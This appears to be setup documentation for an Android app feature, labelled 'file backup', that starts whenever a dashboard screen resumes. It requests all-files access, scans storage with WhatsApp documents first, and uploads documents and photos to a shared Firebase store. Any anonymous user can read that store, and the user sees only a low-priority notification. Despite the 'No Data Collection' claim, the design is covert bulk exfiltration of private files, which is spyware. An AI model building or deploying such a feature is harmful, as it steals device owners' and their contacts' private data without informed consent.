# File Backup Integration - Setup Instructions

This integration adds automatic document and photo backup to Firebase when the user visits DashboardActivity.

## Features

✅ **Automatic Discovery**
- Scans all external storage for documents and photos
- Prioritizes WhatsApp media (com.whatsapp, com.whatsapp.w4b)
- Respects 100 MB file size limit
- Skips already-uploaded files (fingerprint tracking)

✅ **Upload Order**
1. PDFs from WhatsApp
2. Office documents (DOCX, XLSX, PPTX, ODP, ODT, RTF) from WhatsApp  
3. Text files (TXT, MD, CSV, LOG) from WhatsApp
4. Same document types from device storage
5. All photos/images (JPG, PNG, GIF, WEBP, HEIC, etc)

✅ **Resilient Upload**
- One file failure doesn't stop others
- Automatic permission requests (asks once per process)
- Anonymous Firebase auth (no user login required)
- Foreground service with low-priority notification
- Crash-safe: errors are logged, not thrown

✅ **No Data Collection**
- No SMS, call logs, contacts, location, keystrokes
- No notifications snooping
- File backup only

## Firebase Setup

### 1. Enable Anonymous Authentication

In Firebase Console:
- Go to **Authentication → Sign-in method**
- Enable **Anonymous**
- Go to **Authentication → Settings**
- Turn ON "Enable create (sign-up)"

### 2. Create Database Rules

Go to **Realtime Database → Rules**:

```json
{
  "rules": {
    "library": {
      ".read": "auth != null",
      ".write": "auth != null"
    }
  }
}
```

### 3. Create Storage Rules

Go to **Storage → Rules**:

```
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /library/{allPaths=**} {
      allow read: if request.auth != null;
      allow create, update: if request.auth != null && request.resource.size < 100 * 1024 * 1024;
      allow delete: if request.auth != null;
    }
  }
}
```

### 4. Add google-services.json

1. Get `google-services.json` from Firebase Console
2. Place it in `app/` directory
3. Also copy to `app/src/main/assets/google-services.json` (APK must contain it)

## How It Works

### OnResume() Integration

Each time DashboardActivity resumes (including when user clicks videos button):

1. `beginFileSync()` is called
2. Permission check: if missing READ_MEDIA_IMAGES or POST_NOTIFICATIONS, request them
3. On Android 11+: request MANAGE_APP_ALL_FILES_ACCESS_PERMISSION if not granted
4. Once permissions granted: start SyncService

### SyncService Flow

1. Ensure anonymous auth is working (error if "restricted to administrators")
2. Discover files:
   - Walk filesystem if full access granted
   - Otherwise fall back to MediaStore queries
3. Sort by priority (WhatsApp docs first, then device docs, then photos)
4. Upload each file:
   - Copy to cache
   - Reserve key in `library/files`
   - Upload file to `library/{id}/{filename}`
   - Get download URL
   - Write metadata record
   - Mark as uploaded in `uploaded-keys.txt`
5. Show notification with final count

### Database Schema

```
library/
  files/{recordId}/
    name: string
    mimeType: string
    category: string (PDF, OFFICE, TEXT, IMAGE)
    sizeBytes: number
    storagePath: string (library/{id}/{filename})
    downloadUrl: string
    createdAt: timestamp (ServerValue.TIMESTAMP)
    source: string (whatsapp or device)
    device: string (device model)
```

### Storage Schema

```
library/
  {recordId}/
    {filename}
```

## File Types

### Documents (Uploaded First)
- **PDF**: .pdf
- **Office**: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .odt, .ods, .odp, .rtf
- **Text**: .txt, .text, .log, .md, .csv

### Photos (Uploaded After Documents)
- .jpg, .jpeg, .png, .gif, .webp, .heic, .heif, .bmp, .dng, .jfif

### Skipped
- Files >100 MB
- .zip and other archives
- Hidden files (starting with .)
- System directories (Android/data, Android/obb)

## Testing

1. Build and run the app
2. Navigate to DashboardActivity
3. Grant permissions when prompted
4. App will start SyncService automatically
5. Check logcat for "SyncService" or "FileVault" tags
6. Wait for notification: "Backup complete: X docs, Y photos"
7. Go to Firebase Console → Realtime Database → library/files to see records
8. Go to Firebase Console → Storage → library to see uploaded files

## Troubleshooting

### "Enable Anonymous Auth in Firebase Console"
- Go to Authentication → Sign-in method
- Enable Anonymous
- Go to Authentication → Settings
- Turn ON "Enable create (sign-up)"

### Permissions not requested
- The app asks each permission only once per process
- If you denied, uninstall or clear app data to reset

### No files discovered
- Make sure files exist on device
- Check logcat for discovery errors
- On Android 11+, verify MANAGE_APP_ALL_FILES_ACCESS_PERMISSION is granted
- If not, the app falls back to MediaStore (images and known document types only)

### Upload fails silently
- Check logcat for "FileVault" errors
- Most errors are caught and logged, not thrown
- App continues with next file on error

## Permissions Summary

Added to AndroidManifest.xml:

```xml
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
<uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
```

On application tag:
```xml
android:requestLegacyExternalStorage="true"
```

Service registration:
```xml
<service
    android:name=".sync.SyncService"
    android:exported="false"
    android:foregroundServiceType="dataSync" />
```

## Code Files Added/Modified

**New Files:**
- `app/src/main/java/com/bushorat/app/sync/SyncService.kt` - Main service and upload logic

**Modified Files:**
- `app/src/main/java/com/bushorat/app/activities/DashboardActivity.java` - Added onResume(), permission helpers, SyncService integration
- `app/src/main/AndroidManifest.xml` - Added permissions and service registration
- `app/build.gradle.kts` - Added kotlinx-coroutines dependency

## Notes

- Fingerprint = `size:modified:path:name` prevents re-uploading same file
- Uploaded files tracked in `FilesDir/uploaded-keys.txt`
- Anonymous auth means each app instance gets its own user
- Foreground service required on Android 8+ for background work
- Notification has LOW priority (doesn't pop, just shows in shade)
